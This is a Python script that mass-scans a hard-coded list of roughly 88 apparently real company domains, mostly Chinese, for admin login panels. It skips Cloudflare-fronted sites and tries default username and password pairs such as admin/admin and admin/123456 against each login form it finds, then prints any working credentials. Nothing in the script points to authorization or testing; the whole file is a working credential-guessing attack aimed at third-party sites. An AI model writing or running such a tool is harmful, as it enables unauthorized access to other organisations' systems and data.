#!/usr/bin/env python3
"""Mass scan enterprise domains for accessible admin panels."""
import subprocess, json, os, re, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed

DOMAINS = [
"joyalltire.cn","chn-top.cn","shimingchina.com","zonessoft.com","szxmx.net",
"jmguoguo.com","sdmj.com.cn","stad.wang","hongguanjixie.com","bjry168.com",
"bdfuyang.com","hefu56.com","huanyouche.cn","shlonggang.com","jtec.com.cn",
"tongde.sh.cn","taiaojituan.com","silkmachine.cn","longuang.ltd","kbangbox.com",
"vktalent.com","fenglanjs.com","shzyjjzz.com","silverplus-intl.com","qiaobenkeji.com",
"wuzizuifood.com","yz-li.com","linkopto.com","wanzhengdq.com","cixingkeji.com",
"nbzhongxin.net","qdlidong.com","rifutaoci.com","gx-jx.com","jiandaoshi.com",
"qianliyu.com","gdrongda.com","jinhuaruitong.com","hongshengss.cn","yhhuixin.com",
"hnhuawang.com","mun17.com","canbe.com.cn","cn-hunters.com","eleai.net",
"51huilife.com","hpyq.net","hebeihuajiu.com","post-harvest.com.cn","ahcq-scm.com",
"hubeijinheng.com","link-in.com.cn","taiso.com.cn","js-dd.cn","cos-pak.com",
"hkkanglilai.com","cotcchina.com","yingdatest.com","dashengjianshe.com","meijialin.com.cn",
"tianlinfeiye.com","lisoexpo.com","baihaitun100.com.cn","chengtech.com","hcz168.com",
"yurundianqi.com","zj-xgj.com","chinanaisi.com","goglobalcn.com","weipurenzheng.com",
"yurenmed.com","skxclean.com","51-wfhs.com","gzzqswkj.com","hr-times.com","nasonic.com.cn",
"bjhzsv.com","www.joyalltire.com","shicone.com","shanguoying.com","fzmetal.com",
"sdxtly.com","hfjh120.com","hfjinggong.com","hzzlcn.com","jnjzjg.com","kzjx8.com","lzjx.cn"
]

ADMIN_PATHS = ["admin","admin/login","login","admin/login.php","login.php",
    "admin/index.php","admin.php","manager","system","manage","Admin",
    "admin/login.aspx","admin/login.html","wp-admin","administrator","admin/admin.php"]

CREDS = [("admin","admin"),("admin","admin123"),("admin","admin888"),
    ("admin","123456"),("admin","password"),("admin","admin123456"),
    ("admin","888888"),("admin","111111"),("administrator","admin"),
    ("administrator","admin123"),("administrator","123456")]

CRED_FORMS = ["username={u}&password={p}", "user={u}&pass={p}", "name={u}&pwd={p}"]

SUCCESS_KEYWORDS = ["success","正确","成功","main","dashboard","欢迎","登录成功","index_main","welcome"]

os.makedirs("/tmp/scan_results", exist_ok=True)

def curl(args, timeout=5):
    try:
        r = subprocess.run(["curl"] + args, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.returncode
    except:
        return "", -1

def scan_domain(domain):
    result = {"domain": domain, "ips": [], "cloudflare": False, "server": "", "title": "", "logins": [], "hits": [], "captchas": [], "others": []}
    
    # DNS
    try:
        r = subprocess.run(["dig","+short",domain], capture_output=True, text=True, timeout=5)
        result["ips"] = [x for x in r.stdout.strip().split("\n") if x and not x.startswith(";")]
    except:
        pass
    
    # HEAD request
    hd, _ = curl(["-sI", "--max-time", "4", f"http://{domain}"])
    if "cloudflare" in hd.lower() or "cloudfront" in hd.lower():
        result["cloudflare"] = True
        return result
    
    for line in hd.split("\n"):
        if line.lower().startswith("server:"):
            result["server"] = line.split(":",1)[1].strip()
    
    # Get title
    body, _ = curl(["-s", "--max-time", "4", f"http://{domain}"])
    m = re.search(r'<title>(.*?)</title>', body, re.IGNORECASE)
    if m:
        result["title"] = m.group(1).strip()
    
    # Scan admin paths
    for path in ADMIN_PATHS:
        html, code_s = curl(["-s", "-o", f"/dev/null", "-w", "%{http_code}", "--max-time", "3", "-L", f"http://{domain}/{path}"])
        code = code_s
        if not code or code == "404" or code == "000":
            continue
        
        # Get actual body for 200
        if code == "200":
            body, _ = curl(["-s", "--max-time", "3", "-L", f"http://{domain}/{path}"])
            
            if re.search(r'password|登录|login|密码|username|signin', body, re.IGNORECASE):
                entry = f"http://{domain}/{path}"
                result["logins"].append(entry)
                
                # Try credentials
                found = False
                for user, pwd in CREDS:
                    for form in CRED_FORMS:
                        data = form.format(u=user, p=pwd)
                        resp, _ = curl(["-s", "--max-time", "3", f"http://{domain}/{path}", "-d", data, "-L"])
                        for kw in SUCCESS_KEYWORDS:
                            if kw in resp.lower():
                                result["hits"].append({"path": path, "user": user, "pwd": pwd})
                                found = True
                                break
                        if found:
                            break
                    if found:
                        break
                
            elif re.search(r'captcha|验证码|recaptcha|verifycode', body, re.IGNORECASE):
                result["captchas"].append(path)
            else:
                result["others"].append(f"{path}:{code}")
    
    # Save per-domain result
    with open(f"/tmp/scan_results/{domain}.json", "w") as f:
        json.dump(result, f, indent=2)
    
    return result

print(f"Mass scanning {len(DOMAINS)} domains...")
all_results = []

with ThreadPoolExecutor(max_workers=20) as pool:
    futures = {pool.submit(scan_domain, d): d for d in DOMAINS}
    done = 0
    for f in as_completed(futures):
        done += 1
        d = futures[f]
        try:
            r = f.result()
            all_results.append(r)
            sys.stdout.write(f"\rProgress: {done}/{len(DOMAINS)} - {d}")
            sys.stdout.flush()
        except Exception as e:
            sys.stdout.write(f"\rProgress: {done}/{len(DOMAINS)} - {d} ERROR: {e}")
            sys.stdout.flush()

print("\n\n============================================================")
print("SCAN RESULTS SUMMARY")
print("============================================================")

logins_found = [r for r in all_results if r["logins"]]
hits_found = [r for r in all_results if r["hits"]]
cf_found = [r for r in all_results if r["cloudflare"]]

print(f"\n--- CLOUDFLARE DOMAINS ({len(cf_found)}) ---")
for r in cf_found:
    print(f"  {r['domain']} (IPs: {', '.join(r['ips']) if r['ips'] else 'unknown'})")

print(f"\n--- DOMAINS WITH LOGIN FORMS ({len(logins_found)}) ---")
for r in logins_found:
    for url in r["logins"]:
        print(f"  {r['domain']} -> {url}")

print(f"\n--- CREDENTIAL HITS ({len(hits_found)}) ---")
for r in hits_found:
    for h in r["hits"]:
        print(f"  *** {r['domain']} | {h['path']} | {h['user']}:{h['pwd']} ***")

print(f"\n--- ALL LOGIN INFO ---")
for r in all_results:
    if r["logins"]:
        print(f"\n{r['domain']}:")
        print(f"  Server: {r['server']}")
        print(f"  IPs: {', '.join(r['ips']) if r['ips'] else 'N/A'}")
        print(f"  Title: {r['title'][:80] if r['title'] else 'N/A'}")
        for url in r["logins"]:
            print(f"  LOGIN: {url}")
        if r["hits"]:
            for h in r["hits"]:
                print(f"  *** CREDENTIALS: {h['user']} / {h['pwd']} ***")
        else:
            print(f"  Default creds: no luck")

print(f"\n\nTotal domains scanned: {len(DOMAINS)}")
print(f"Cloudflare: {len(cf_found)}")
print(f"Login forms: {len(logins_found)}")
print(f"Credential hits: {len(hits_found)}")
